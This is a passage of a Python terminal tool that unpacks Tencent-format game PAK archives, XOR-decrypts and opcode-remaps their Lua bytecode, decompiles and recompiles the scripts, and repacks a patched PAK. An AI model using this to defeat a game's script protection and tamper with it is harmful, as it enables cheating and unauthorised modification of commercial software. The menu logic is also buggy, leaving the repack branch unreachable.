        for i in range(length):
            out.append(d[ds + i] ^ LUA_XOR_KEY[i % len(LUA_XOR_KEY)])
    std_opcode_names = [
        "MOVE", "LOADK", "LOADKX", "LOADBOOL", "LOADNIL",
        "GETUPVAL", "GETTABUP", "GETTABLE", "SETTABUP", "SETUPVAL",
        "SETTABLE", "NEWTABLE", "SELF", "ADD", "SUB",
        "MUL", "MOD", "POW", "DIV", "IDIV",
        "BAND", "BOR", "BXOR", "SHL", "SHR",
        "UNM", "BNOT", "NOT", "LEN", "CONCAT",
        "JMP", "EQ", "LT", "LE", "TEST",
        "TESTSET", "CALL", "TAILCALL", "RETURN", "FORLOOP",
        "FORPREP", "TFORCALL", "TFORLOOP", "SETLIST", "CLOSURE",
        "VARARG", "EXTRAARG"
    ]
    t24_name_shuffled = {
        0: "ADD", 1: "SUB", 2: "MUL", 5: "DIV", 7: "BAND", 10: "SHL",
        12: "UNM", 14: "NOT", 15: "LEN", 16: "CONCAT",
        17: "MOVE", 18: "LOADK", 20: "LOADBOOL", 21: "LOADNIL",
        22: "GETUPVAL", 23: "GETTABUP", 24: "GETTABLE",
        8: "SETTABUP", 9: "SETUPVAL", 27: "SETTABLE", 28: "NEWTABLE", 29: "SELF",
        30: "JMP", 31: "EQ", 32: "LT", 33: "LE", 34: "TEST", 35: "TESTSET",
        36: "CALL", 37: "TAILCALL", 38: "RETURN",
        39: "FORLOOP", 40: "FORPREP", 41: "TFORCALL", 42: "TFORLOOP",
        43: "SETLIST", 44: "CLOSURE", 45: "VARARG",
    }
    std_to_t24 = {std_opcode_names.index(nm): t24 for t24, nm in t24_name_shuffled.items() if nm in std_opcode_names}
    def rebuild():
        xenc()
        wi32(ri32())
        wi32(ri32())
        out.append(rb())
        out.append(rb())
        out.append(rb())
        n = ri32()
        wi32(n)
        for _ in range(n):
            ins = struct.unpack_from('<I', d, pos[0])[0]
            pos[0] += 4
            std_op = ins & 0x3F
            t24_op = std_to_t24.get(std_op, std_op)
            wu32((ins & ~0x3F) | t24_op)
        n = ri32()
        wi32(n)
        for _ in range(n):
            t = rb()
            out.append(t)
            if t == 0:
                pass
            elif t == 1:
                out.append(rb())
            elif t == 3:
                wf64(rf64())
            elif t == 19:
                wi64(ri64())
            elif t in (4, 20):
                xenc()
            else:
                raise ValueError(f'Unknown const type {t}')
        n = ri32()
        wi32(n)
        for _ in range(n):
            out.append(rb())
            out.append(rb())
        n = ri32()
        wi32(n)
        for _ in range(n):
            rebuild()
        n = ri32()
        lines_i32 = []
        for _ in range(n):
            lines_i32.append(struct.unpack_from('<i', d, pos[0])[0])
            pos[0] += 4
        wi32(n)
        for ln in lines_i32:
            out.append(ln & 0xFF)
        ABSLINE_INTERVAL = 128
        if n >= ABSLINE_INTERVAL:
            abs_entries = [(pc, lines_i32[pc]) for pc in range(ABSLINE_INTERVAL, n, ABSLINE_INTERVAL)]
            wi32(len(abs_entries))
            for _pc, _ln in abs_entries:
                wi32(_pc)
                wi32(_ln)
        else:
            wi32(0)
        n = ri32()
        wi32(n)
        for _ in range(n):
            xenc()
            wi32(ri32())
            wi32(ri32())
        n = ri32()
        wi32(n)
        for _ in range(n):
            xenc()
    try:
        rebuild()
        return bytes(out)
    except Exception:
        return None

def safe_optimize_lua(src):
    """Optimize Lua source code"""
    try:
        src = re.sub(r'--\[\[.*?\]\]', '', src, flags=re.S)
        src = re.sub(r'--[^\n]*', '', src)
        src = re.sub(r'[ \t]+$', '', src, flags=re.M)
        src = re.sub(r'\n\s*\n+', '\n', src)
        return src.strip()
    except Exception:
        return src

def compile_with_optimizer(in_path, out_path, orig_sname=None):
    """Compile Lua with optimization"""
    try:
        with open(in_path, 'r', encoding='utf-8') as f:
            original_src = f.read()
        optimized_src = safe_optimize_lua(original_src)
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.lua', mode='w', encoding='utf-8')
        tmp.write(optimized_src)
        tmp.close()
        ok, err, tool = compile_lua_file(tmp.name, out_path, orig_source_name=orig_sname)
        try:
            os.unlink(tmp.name)
        except:
            pass
        return ok, err, tool
    except Exception as e:
        return False, str(e), "optimizer"

def extract_source_name_t24(t24_path):
    """Extract source name from T24 bytecode"""
    try:
        with open(t24_path, 'rb') as f:
            d = f.read()
        if len(d) < 36 or d[:4] != b'\x1bLua' or d[4] != 0x53:
            return None
        pos = 34
        sz = d[pos]
        if sz == 0:
            return ''
        elif sz == 0xFF:
            if len(d) < pos + 9:
                return None
            length = struct.unpack_from('<Q', d, pos + 1)[0] - 1
            if len(d) < pos + 9 + length:
                return None
            name_bytes = bytes(d[pos + 9 + i] ^ LUA_XOR_KEY[i % len(LUA_XOR_KEY)] for i in range(length))
        else:
            length = sz - 1
            if len(d) < pos + 1 + length:
                return None
            name_bytes = bytes(d[pos + 1 + i] ^ LUA_XOR_KEY[i % len(LUA_XOR_KEY)] for i in range(length))
        return name_bytes.decode('utf-8', errors='replace')
    except Exception:
        return None

# ============================================================
# PAK + LUA TOOL MAIN FUNCTIONS
# ============================================================

def pak_lua_fmt_size(n: int) -> str:
    """Format file size"""
    if n < 1024:
        return f"{n}B"
    elif n < 1024**2:
        return f"{n/1024:.1f}KB"
    elif n < 1024**3:
        return f"{n/1024**2:.1f}MB"
    else:
        return f"{n/1024**3:.2f}GB"

def pak_lua_select_pak():
    """Select a PAK file from PAKS directory"""
    ensure_pak_lua_dirs()
    theme = get_theme_colors()
    paks = sorted(PAKS_DIR.glob('*.pak'))
    if not paks:
        console.print(Panel(
            f'[{theme["error"]}]❌ No .pak files found in PAKS/ folder![/]\n\n'
            f'[{theme["info"]}]💡 Please place your .pak files in:[/]\n'
            f'[{theme["text"]}]{PAKS_DIR}[/]',
            border_style=theme["error"],
            box=box.ROUNDED
        ))
        return None
    table = Table(title="[bold cyan]📁 Select PAK File[/bold cyan]", box=box.ROUNDED, border_style="cyan")
    table.add_column("#", style="bold yellow", justify="center", width=4)
    table.add_column("File Name", style="white")
    table.add_column("Size", style="cyan", justify="right")
    for i, p in enumerate(paks, 1):
        table.add_row(str(i), p.name, pak_lua_fmt_size(p.stat().st_size))
    table.add_row(str(len(paks) + 1), "Back to Menu", "")
    console.print(table)
    console.print()
    try:
        choice = int(Prompt.ask("[bold yellow]Select option[/bold yellow]", default=""))
        if choice == len(paks) + 1:
            return None
        elif 1 <= choice <= len(paks):
            return paks[choice - 1]
        else:
            console.print("[red]❌ Invalid selection[/red]")
            return None
    except ValueError:
        console.print("[red]❌ Invalid input[/red]")
        return None

def pak_lua_select_unpacked_folder():
    """Select an unpacked folder for repacking"""
    ensure_pak_lua_dirs()
    theme = get_theme_colors()
    valid = []
    try:
        for f in sorted(UNPACKED_DIR.iterdir()):
            if f.is_dir():
                manifest_path = MANIFEST_DIR / f.name / 'manifest.json'
                pak_path = PAKS_DIR / f"{f.name}.pak"
                if manifest_path.exists() and pak_path.exists():
                    valid.append(f)
    except FileNotFoundError:
        pass
    
    if not valid:
        console.print(Panel(
            f'[{theme["warning"]}]⚠ No valid unpacked folders found![/]\n\n'
            f'[{theme["info"]}]💡 Please unpack a PAK file first using option 1.[/]',
            border_style=theme["warning"],
            box=box.ROUNDED
        ))
        return None
    
    table = Table(title="[bold cyan]📁 Select Unpacked Folder[/bold cyan]", box=box.ROUNDED, border_style="cyan")
    table.add_column("#", style="bold yellow", justify="center", width=4)
    table.add_column("Folder Name", style="white")
    table.add_column("Lua Files", style="cyan", justify="right")
    for i, f in enumerate(valid, 1):
        try:
            lua_count = len(list(f.glob('*.lua')))
        except:
            lua_count = 0
        table.add_row(str(i), f.name, str(lua_count))
    table.add_row(str(len(valid) + 1), "Back to Menu", "")
    console.print(table)
    console.print()
    try:
        choice = int(Prompt.ask("[bold yellow]Select option[/bold yellow]", default=""))
        if choice == len(valid) + 1:
            return None
        elif 1 <= choice <= len(valid):
            return valid[choice - 1]
        else:
            console.print("[red]❌ Invalid selection[/red]")
            return None
    except ValueError:
        console.print("[red]❌ Invalid input[/red]")
        return None

def pak_lua_select_edit_folder():
    """Select an EDIT_LUA folder for compilation"""
    ensure_pak_lua_dirs()
    theme = get_theme_colors()
    
    try:
        edit_folders = [f for f in sorted(LUA_EDIT_DIR.iterdir()) if f.is_dir()]
    except FileNotFoundError:
        edit_folders = []
    
    root_lua = list(LUA_EDIT_DIR.glob('*.lua')) if LUA_EDIT_DIR.exists() else []
    
    if not edit_folders and not root_lua:
        console.print(Panel(
            f'[{theme["warning"]}]⚠ No files found in EDIT_LUA/ folder![/]\n\n'
            f'[{theme["info"]}]💡 Please place edited .lua files in:[/]\n'
            f'[{theme["text"]}]{LUA_EDIT_DIR}[/]',
            border_style=theme["warning"],
            box=box.ROUNDED
        ))
        return None, None
    
    table = Table(title="[bold cyan]📁 Select Edit Folder[/bold cyan]", box=box.ROUNDED, border_style="cyan")
    table.add_column("#", style="bold yellow", justify="center", width=4)
    table.add_column("Folder Name", style="white")
    table.add_column("Lua Files", style="cyan", justify="right")
    
    for i, f in enumerate(edit_folders, 1):
        try:
            lua_count = len(list(f.glob('*.lua')))
        except:
            lua_count = 0
        table.add_row(str(i), f.name, str(lua_count))
    
    if root_lua:
        table.add_row(str(len(edit_folders) + 1), "Root EDIT_LUA/", str(len(root_lua)))
    
    table.add_row(str(len(edit_folders) + (1 if root_lua else 0) + 1), "Back to Menu", "")
    console.print(table)
    console.print()
    
    try:
        choice = int(Prompt.ask("[bold yellow]Select option[/bold yellow]", default=""))
        total_options = len(edit_folders) + (1 if root_lua else 0)
        if choice == total_options + 1:
            return None, None
        elif choice <= len(edit_folders):
            return edit_folders[choice - 1], edit_folders[choice - 1].name
        elif root_lua and choice == len(edit_folders) + 1:
            return LUA_EDIT_DIR, "compiled"
        else:
            console.print("[red]❌ Invalid selection[/red]")
            return None, None
    except ValueError:
        console.print("[red]❌ Invalid input[/red]")
        return None, None

# ============================================================
# PAK + LUA TOOL HANDLER FUNCTIONS
# ============================================================

def pak_lua_unpack():
    """Unpack PAK and extract LUA files"""
    ensure_pak_lua_dirs()
    theme = get_theme_colors()
    
    console.print(Panel(
        f'[{theme["title"]}]📦 UNPACK PAK FILE[/]\n'
        f'[{theme["dim"]}]{"─" * 36}[/]\n\n'
        f'[{theme["info"]}]Extract .lua files from PAK and optionally decompile them.[/]',
        border_style=theme["panel_border"],
        box=box.ROUNDED
    ))
    console.print()
    
    if not HAS_PAK_DEPS:
        console.print(Panel(
            f'[{theme["error"]}]❌ PAK dependencies missing![/]\n\n'
            f'[{theme["info"]}]Please install: pycryptodome, zstandard, gmalg[/]',
            border_style=theme["error"],
            box=box.ROUNDED
        ))
        Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
        return
    
    pak_file = pak_lua_select_pak()
    if not pak_file:
        return
    
    also_decrypt = Prompt.ask(
        "[bold cyan]Decrypt LUA files after extraction? (y/n)[/bold cyan]",
        choices=['y', 'n'],
        default='y'
    ).lower() == 'y'
    
    try:
        console.print(f"\n[{theme['info']}]📂 Processing: {pak_file.name}[/]")
        
        with Progress(
            SpinnerColumn(spinner_name="dots12", style="bold cyan"),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console,
            expand=True
        ) as progress:
            task = progress.add_task("[cyan]Loading PAK structure...", total=100)
            
            pak_instance = TencentPakFile(pak_file, is_od=False)
            progress.update(task, advance=40)
            
            progress.update(task, description="[cyan]Extracting LUA files...")
            progress.update(task, advance=60)
            
            pak_stem = pak_file.stem
            output_dir = UNPACKED_DIR / pak_stem
            output_dir.mkdir(parents=True, exist_ok=True)
            
            lua_extracted = 0
            for dir_path, files in pak_instance._index.items():
                for fname, entry in files.items():
                    if Path(fname).suffix.lower() != '.lua':
                        continue
                    if entry.encrypted and entry.encryption_method == 17:
                        continue
                    out_file = output_dir / fname
                    out_file.parent.mkdir(parents=True, exist_ok=True)
                    try:
                        pak_instance._write_to_disk(out_file, entry)
                        lua_extracted += 1
                    except Exception as e:
                        console.print(f"[yellow]⚠ Failed {fname}: {e}[/yellow]")
            
            progress.update(task, completed=100)
        
        console.print(f"\n[{theme['success']}]✅ Extracted {lua_extracted} .lua files to: {output_dir}[/]")
        
        manifest_dir = MANIFEST_DIR / pak_stem
        manifest_dir.mkdir(parents=True, exist_ok=True)
        manifest_data = {
            'pak_name': pak_file.name,
            'pak_stem': pak_stem,
            'lua_count': lua_extracted,
            'created_at': datetime.now().isoformat()
        }
        with open(manifest_dir / 'manifest.json', 'w') as f:
            json.dump(manifest_data, f, indent=2)
        
        if also_decrypt and lua_extracted > 0:
            console.print(f"\n[{theme['accent']}]🔓 Auto-decompiling LUA files...[/]")
            
            java_jar, _ = get_lua_tools()
            
            dec_dir = LUA_DECOMPILED_DIR / pak_stem
            orig_dir = LUA_ORIGINAL_DIR / pak_stem
            dec_dir.mkdir(parents=True, exist_ok=True)
            orig_dir.mkdir(parents=True, exist_ok=True)
            
            lua_files = list(output_dir.glob('*.lua'))
            ok_count = 0
            fail_count = 0
            
            with Progress(
                BarColumn(),
                TextColumn("[progress.description]{task.description}"),
                TaskProgressColumn(),
                console=console
            ) as progress:
                task = progress.add_task("[cyan]Decompiling LUA files...", total=len(lua_files))
                
                for lua_file in lua_files:
                    progress.update(task, description=f"[cyan]{lua_file.name[:40]}...")
                    shutil.copy2(lua_file, orig_dir / lua_file.name)
                    out_path = dec_dir / lua_file.name
                    ok, err_msg, tool, lines, artifacts = decompile_lua_file(
                        str(lua_file), str(out_path), java_jar
                    )
                    if ok:
                        ok_count += 1
                    else:
                        fail_count += 1
                        console.print(f"[yellow]⚠ Failed {lua_file.name}: {err_msg}[/yellow]")
                    progress.update(task, advance=1)
            
            console.print(f"\n[{theme['success']}]✅ Decompiled: {ok_count} OK, {fail_count} failed -> {dec_dir}[/]")
            
            edit_dir = LUA_EDIT_DIR / pak_stem
            edit_dir.mkdir(parents=True, exist_ok=True)
            
            console.print(Panel(
                f'[{theme["title"]}]📝 NEXT STEP[/]\n\n'
                f'[{theme["info"]}]1. Edit LUA files in:[/]\n'
                f'[{theme["text"]}]{dec_dir}[/]\n\n'
                f'[{theme["info"]}]2. Place edited files in:[/]\n'
                f'[{theme["text"]}]{edit_dir}[/]\n\n'
                f'[{theme["info"]}]3. Use "Compile LUA Files" (option 3) to compile[/]\n'
                f'[{theme["info"]}]4. Use "Repack PAK" (option 2) to repack[/]',
                border_style=theme["success"],
                box=box.ROUNDED
            ))
        
        pak_instance.close()
        
    except Exception as e:
        console.print(Panel(
            f'[{theme["error"]}]❌ Unpack failed: {e}[/]',
            border_style=theme["error"],
            box=box.ROUNDED
        ))
        traceback.print_exc()
    
    Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

def pak_lua_repack():
    """Repack PAK with modified LUA files"""
    ensure_pak_lua_dirs()
    theme = get_theme_colors()
    
    console.print(Panel(
        f'[{theme["title"]}]📦 REPACK PAK FILE[/]\n'
        f'[{theme["dim"]}]{"─" * 36}[/]\n\n'
        f'[{theme["info"]}]Repack PAK with modified LUA files (auto-compiles if needed).[/]',
        border_style=theme["panel_border"],
        box=box.ROUNDED
    ))
    console.print()
    
    if not HAS_PAK_DEPS:
        console.print(Panel(
            f'[{theme["error"]}]❌ PAK dependencies missing![/]\n\n'
            f'[{theme["info"]}]Please install: pycryptodome, zstandard, gmalg[/]',
            border_style=theme["error"],
            box=box.ROUNDED
        ))
        Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
        return
    
    folder = pak_lua_select_unpacked_folder()
    if not folder:
        return
    
    pak_stem = folder.name
    
    also_compile = Prompt.ask(
        "[bold cyan]Compile LUA files before repacking? (y/n)[/bold cyan]",
        choices=['y', 'n'],
        default='y'
    ).lower() == 'y'
    
    edit_dir = None
    if also_compile:
        edit_dir = LUA_EDIT_DIR / pak_stem
        if not edit_dir.exists() or not list(edit_dir.glob('*.lua')):
            console.print(Panel(
                f'[{theme["warning"]}]⚠ No .lua files found in EDIT_LUA/{pak_stem}/[/]\n\n'
                f'[{theme["info"]}]Please place edited files here:[/]\n'
                f'[{theme["text"]}]{edit_dir}[/]',
                border_style=theme["warning"],
                box=box.ROUNDED
            ))
            if Prompt.ask("[bold yellow]Continue without compile? (y/n)[/bold yellow]", choices=['y', 'n'], default='n') != 'y':
                return
            also_compile = False
            edit_dir = folder / 'edited'
    else:
        edit_dir = folder / 'edited'
    
    if not also_compile and not edit_dir.exists():
        console.print(Panel(
            f'[{theme["error"]}]❌ No "edited" subfolder in {folder}[/]',
            border_style=theme["error"],
            box=box.ROUNDED
        ))
        return
    
    output_pak = REPACKED_DIR / f'{pak_stem}.pak'
    source_pak = PAKS_DIR / f'{pak_stem}.pak'
    
    if not source_pak.exists():
        console.print(Panel(
            f'[{theme["error"]}]❌ Source PAK not found: {source_pak}[/]',
            border_style=theme["error"],
            box=box.ROUNDED
        ))
        return
    
    console.print(Panel(
        f'[{theme["info"]}]📂 Source: {edit_dir}[/]\n'
        f'[{theme["info"]}]📦 Output: {output_pak}[/]',
        border_style=theme["accent"],
        box=box.ROUNDED
    ))
    
    confirm = Prompt.ask("[bold yellow]Proceed with repack? (y/n)[/bold yellow]", choices=['y', 'n'], default='y')
    if confirm != 'y':
        return
    
    try:
        with Progress(
            SpinnerColumn(spinner_name="dots12", style="bold cyan"),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=console,
            expand=True
        ) as progress:
            task = progress.add_task("[cyan]Preparing repack...", total=100)
            
            pak_instance = TencentPakFile(source_pak, is_od=False)
            progress.update(task, advance=20)
            
            if also_compile:
                progress.update(task, description="[cyan]Compiling LUA files...")
                
                java_jar, _ = get_lua_tools()
                
                compiled_dir = LUA_COMPILED_DIR / pak_stem
                compiled_dir.mkdir(parents=True, exist_ok=True)
                
                lua_sources = list(edit_dir.glob('*.lua'))
                ok_count = 0
                fail_count = 0
                
                sub_task = progress.add_task("[cyan]Compiling...", total=len(lua_sources))
                
                for src_file in lua_sources:
                    progress.update(sub_task, description=f"[cyan]{src_file.name[:40]}...")
                    
                    out_bc = compiled_dir / src_file.name
                    orig_t24 = LUA_ORIGINAL_DIR / pak_stem / src_file.name
                    orig_sname = extract_source_name_t24(str(orig_t24)) if orig_t24.exists() else None
                    
                    ok, err_msg, tool = compile_with_optimizer(str(src_file), str(out_bc), orig_sname)
                    
                    if ok:
                        ok_count += 1
                    else:
                        fail_count += 1
                        console.print(f"[yellow]⚠ Compile failed {src_file.name}: {err_msg}[/yellow]")
                    
                    progress.update(sub_task, advance=1)
                
                console.print(f"[{theme['success']}]✅ Compiled: {ok_count} OK, {fail_count} failed -> {compiled_dir}[/]")
                
                if ok_count == 0:
                    console.print("[red]❌ No files compiled — repack aborted[/red]")
                    pak_instance.close()
                    return
                
                edit_dir = compiled_dir
                progress.update(task, advance=40)
            
            progress.update(task, description="[cyan]Repacking PAK...")
            
            output_pak.parent.mkdir(parents=True, exist_ok=True)
            
            shutil.copy2(source_pak, output_pak)
            
            pak_instance.repack(edit_dir, output_pak, report=None)
            
            progress.update(task, advance=40)
            progress.update(task, completed=100)
        
        console.print(Panel(
            f'[{theme["success"]}]✅ REPACK COMPLETE![/]\n\n'
            f'[{theme["info"]}]📦 Output: {output_pak}[/]',
            border_style=theme["success"],
            box=box.ROUNDED
        ))
        
        pak_instance.close()
        
    except Exception as e:
        console.print(Panel(
            f'[{theme["error"]}]❌ Repack failed: {e}[/]',
            border_style=theme["error"],
            box=box.ROUNDED
        ))
        traceback.print_exc()
    
    Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

def pak_lua_decompile():
    """Decompile LUA files from unpacked PAK"""
    ensure_pak_lua_dirs()
    theme = get_theme_colors()
    
    console.print(Panel(
        f'[{theme["title"]}]🔓 DECRYPT LUA FILES[/]\n'
        f'[{theme["dim"]}]{"─" * 36}[/]\n\n'
        f'[{theme["info"]}]Decompile LUA bytecode to readable source code.[/]',
        border_style=theme["panel_border"],
        box=box.ROUNDED
    ))
    console.print()
    
    unpacked_folders = []
    try:
        for f in sorted(UNPACKED_DIR.iterdir()):
            if f.is_dir() and list(f.glob('*.lua')):
                unpacked_folders.append(f)
    except FileNotFoundError:
        pass
    
    if not unpacked_folders:
        console.print(Panel(
            f'[{theme["warning"]}]⚠ No unpacked folders with LUA files found![/]\n\n'
            f'[{theme["info"]}]💡 Please unpack a PAK file first using option 1.[/]',
            border_style=theme["warning"],
            box=box.ROUNDED
        ))
        Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
        return
    
    table = Table(title="[bold cyan]📁 Select Unpacked Folder[/bold cyan]", box=box.ROUNDED, border_style="cyan")
    table.add_column("#", style="bold yellow", justify="center", width=4)
    table.add_column("Folder Name", style="white")
    table.add_column("Lua Files", style="cyan", justify="right")
    
    for i, f in enumerate(unpacked_folders, 1):
        try:
            lua_count = len(list(f.glob('*.lua')))
        except:
            lua_count = 0
        table.add_row(str(i), f.name, str(lua_count))
    
    table.add_row(str(len(unpacked_folders) + 1), "Back to Menu", "")
    console.print(table)
    console.print()
    
    try:
        choice = int(Prompt.ask("[bold yellow]Select option[/bold yellow]", default=""))
        if choice == len(unpacked_folders) + 1:
            return
        elif 1 <= choice <= len(unpacked_folders):
            folder = unpacked_folders[choice - 1]
        else:
            console.print("[red]❌ Invalid selection[/red]")
            return
    except ValueError:
        console.print("[red]❌ Invalid input[/red]")
        return
    
    lua_files = list(folder.glob('*.lua'))
    if not lua_files:
        console.print(Panel(
            f'[{theme["warning"]}]⚠ No .lua files found in {folder}[/]',
            border_style=theme["warning"],
            box=box.ROUNDED
        ))
        Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
        return
    
    dec_dir = LUA_DECOMPILED_DIR / folder.name
    orig_dir = LUA_ORIGINAL_DIR / folder.name
    dec_dir.mkdir(parents=True, exist_ok=True)
    orig_dir.mkdir(parents=True, exist_ok=True)
    
    java_jar, _ = get_lua_tools()
    
    ok_count = 0
    fail_count = 0
    
    console.print(f"\n[{theme['info']}]🔓 Decompiling {len(lua_files)} LUA files...[/]\n")
    
    with Progress(
        BarColumn(),
        TextColumn("[progress.description]{task.description}"),
        TaskProgressColumn(),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Decompiling...", total=len(lua_files))
        
        for lua_file in lua_files:
            progress.update(task, description=f"[cyan]{lua_file.name[:40]}...")
            
            shutil.copy2(lua_file, orig_dir / lua_file.name)
            
            out_path = dec_dir / lua_file.name
            ok, err_msg, tool, lines, artifacts = decompile_lua_file(
                str(lua_file), str(out_path), java_jar
            )
            
            if ok:
                ok_count += 1
                console.print(f"[green]✔ {lua_file.name}[/green]")
            else:
                fail_count += 1
                console.print(f"[yellow]⚠ {lua_file.name}: {err_msg}[/yellow]")
            
            progress.update(task, advance=1)
    
    console.print(Panel(
        f'[{theme["success"]}]✅ DECOMPILATION COMPLETE![/]\n\n'
        f'[{theme["info"]}]✅ Success: {ok_count} files[/]\n'
        f'[{theme["error"]}]❌ Failed: {fail_count} files[/]\n\n'
        f'[{theme["info"]}]📁 Output: {dec_dir}[/]\n\n'
        f'[{theme["accent"]}]📝 Edit files in DECOMPILED/{folder.name}/[/]\n'
        f'[{theme["accent"]}]📂 Then place in EDIT_LUA/{folder.name}/ for compilation[/]',
        border_style=theme["success"],
        box=box.ROUNDED
    ))
    
    edit_dir = LUA_EDIT_DIR / folder.name
    edit_dir.mkdir(parents=True, exist_ok=True)
    
    Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

def pak_lua_compile():
    """Compile LUA files to bytecode"""
    ensure_pak_lua_dirs()
    theme = get_theme_colors()
    
    console.print(Panel(
        f'[{theme["title"]}]📝 COMPILE LUA FILES[/]\n'
        f'[{theme["dim"]}]{"─" * 36}[/]\n\n'
        f'[{theme["info"]}]Compile edited LUA files to bytecode for repacking.[/]',
        border_style=theme["panel_border"],
        box=box.ROUNDED
    ))
    console.print()
    
    edit_dir, stem = pak_lua_select_edit_folder()
    if not edit_dir:
        return
    
    lua_files = list(edit_dir.glob('*.lua'))
    if not lua_files:
        console.print(Panel(
            f'[{theme["warning"]}]⚠ No .lua files found in {edit_dir}[/]',
            border_style=theme["warning"],
            box=box.ROUNDED
        ))
        Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
        return
    
    out_dir = LUA_COMPILED_DIR / stem
    out_dir.mkdir(parents=True, exist_ok=True)
    
    ok_count = 0
    fail_count = 0
    
    console.print(f"\n[{theme['info']}]📝 Compiling {len(lua_files)} LUA files...[/]\n")
    
    with Progress(
        BarColumn(),
        TextColumn("[progress.description]{task.description}"),
        TaskProgressColumn(),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Compiling...", total=len(lua_files))
        
        for src_file in lua_files:
            progress.update(task, description=f"[cyan]{src_file.name[:40]}...")
            
            out_bc = out_dir / src_file.name
            orig_t24 = LUA_ORIGINAL_DIR / stem / src_file.name
            orig_sname = extract_source_name_t24(str(orig_t24)) if orig_t24.exists() else None
            
            ok, err_msg, tool = compile_with_optimizer(str(src_file), str(out_bc), orig_sname)
            
            if ok:
                ok_count += 1
                console.print(f"[green]✔ {src_file.name}[/green]")
            else:
                fail_count += 1
                console.print(f"[yellow]⚠ {src_file.name}: {err_msg}[/yellow]")
            
            progress.update(task, advance=1)
    
    console.print(Panel(
        f'[{theme["success"]}]✅ COMPILATION COMPLETE![/]\n\n'
        f'[{theme["info"]}]✅ Success: {ok_count} files[/]\n'
        f'[{theme["error"]}]❌ Failed: {fail_count} files[/]\n\n'
        f'[{theme["info"]}]📁 Output: {out_dir}[/]\n\n'
        f'[{theme["accent"]}]📦 Now use "Repack PAK" (option 2) to repack.[/]',
        border_style=theme["success"],
        box=box.ROUNDED
    ))
    
    Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

def pak_lua_show_info():
    """Show information about the PAK+LUA tool"""
    ensure_pak_lua_dirs()
    theme = get_theme_colors()
    
    info_text = f"""
[{theme["title"]}]📖 PAK + LUA TOOL INFORMATION[/]

[{theme["accent"]}]🔧 WHAT IT DOES:[/]
This tool allows you to:
• Unpack PAK files and extract LUA bytecode
• Decompile LUA bytecode to readable source
• Edit LUA files and recompile them
• Repack PAK with modified LUA files

[{theme["accent"]}]📁 FOLDER STRUCTURE:[/]
[{theme["text"]}]PAK_LUA_TOOL/[/]
├── PAKS/           ← Place your .pak files here
├── unpacked/       ← Extracted LUA files
├── repacked/       ← Repacked PAK files
├── Manifest/       ← PAK metadata
├── LUA_ORIGINAL/   ← Original LUA bytecode backup
├── DECOMPILED/     ← Decompiled LUA source
├── EDIT_LUA/       ← Place edited LUA files here
├── COMPILED/       ← Compiled LUA bytecode
└── temp/           ← Temporary files

[{theme["accent"]}]🔄 WORKFLOW:[/]
1. Place .pak in [{theme["text"]}]PAKS/[/]
2. Run [{theme["text"]}]Option 1 - Unpack PAK[/]
3. Edit LUA files in [{theme["text"]}]DECOMPILED/[/]
4. Place edited files in [{theme["text"]}]EDIT_LUA/[/]
5. Run [{theme["text"]}]Option 3 - Compile LUA[/]
6. Run [{theme["text"]}]Option 2 - Repack PAK[/]

[{theme["accent"]}]📦 REQUIREMENTS:[/]
• Java Runtime (for decompilation)
• Lua 5.3 compiler (for compilation)
• Python 3.8+

[{theme["accent"]}]💡 INSTALL ON TERMUX:[/]
[{theme["text"]}]pkg install python openjdk-17 lua53[/]
[{theme["text"]}]pip install pycryptodome zstandard gmalg requests[/]
"""
    
    console.print(Panel(
        info_text,
        border_style=theme["panel_border"],
        box=box.ROUNDED
    ))
    
    Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')

# Update the handle_pak_lua_tool() function menu:

def handle_pak_lua_tool():
    """Main PAK+LUA Tool handler - Option 20"""
    ensure_pak_lua_dirs()
    
    theme = get_theme_colors()
    
    # Check dependencies
    missing = check_lua_pak_dependencies()
    if missing:
        console.print(Panel(
            f'[{theme["warning"]}]⚠ Missing dependencies: {", ".join(missing)}[/]\n\n'
            f'[{theme["info"]}]Some features may not work properly.[/]\n'
            f'[{theme["info"]}]Use option 6 to install dependencies.[/]',
            border_style=theme["warning"],
            box=box.ROUNDED
        ))
    
    while True:
        show_banner()
        
        menu_content = f"""
[{theme["title"]}]📦 PAK + LUA TOOL[/]
[{theme["dim"]}]{"─" * 36}[/]

[{theme["info"]}]📂 Tool Directory: {PAK_LUA_DIR}[/]

[{theme["success"]}][1][/{theme["success"]}] HR DHAMA GAMEPATCH     [{theme["accent"]}]➛ Unpack + Smart Rebuild[/]
[{theme["success"]}][2][/{theme["success"]}] DECOMPILE LUA          [{theme["accent"]}]➛ Convert bytecode to source[/]
[{theme["success"]}][3][/{theme["success"]}] COMPILE LUA            [{theme["accent"]}]➛ Convert source to bytecode[/]
[{theme["success"]}][4][/{theme["success"]}] INSTALL DEPENDENCIES   [{theme["accent"]}]➛ Install required packages[/]
[{theme["success"]}][5][/{theme["success"]}] SHOW INFO             [{theme["accent"]}]➛ Tool documentation[/]

[{theme["error"]}][0][/{theme["error"]}] BACK TO MAIN MENU
"""
        
        console.print(Panel(
            menu_content,
            border_style=theme["panel_border"],
            padding=(1, 3),
            box=box.ROUNDED
        ))
        console.print()
        
        try:
            choice = Prompt.ask(f'[{theme["accent"]}]Select option [/]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice == "":
            pak_lua_unpack()
        elif choice == "":
            pak_lua_repack()
        elif choice == "2":
            pak_lua_decompile()
        elif choice == "3":
            pak_lua_compile()
        elif choice == "1":
            handle_hr_dhama_tool()
        elif choice == "4":
            install_lua_pak_deps()
            Prompt.ask(f'[{theme["dim"]}]Press Enter to continue...[/]', default='')
        elif choice == "5":
            pak_lua_show_info()
